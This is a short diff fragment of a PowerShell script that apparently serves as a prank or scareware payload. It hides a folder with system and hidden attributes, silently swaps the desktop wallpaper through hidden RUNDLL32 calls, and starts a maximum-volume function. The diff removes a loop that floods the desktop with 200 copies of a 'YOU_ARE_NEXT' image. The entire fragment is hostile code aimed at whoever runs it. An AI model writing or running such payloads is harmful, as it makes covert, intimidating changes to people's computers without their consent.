@@ -17,13 +17,6 @@ attrib +s +h "$env:USERPROFILE\temp";
 # Change wallpaper
 Set-ItemProperty 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\w.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden;};
 
-# Fill desktop with images
-$f = 0
-WHILE($f -lt 200){
-cp $env:USERPROFILE\Desktop\YOU_ARE_NEXT.png $env:USERPROFILE\Desktop\YOU_ARE_NEXT_$f.png
-$f++
-}
-
 # Define max volume
 Function Set-SpeakerVolume
 
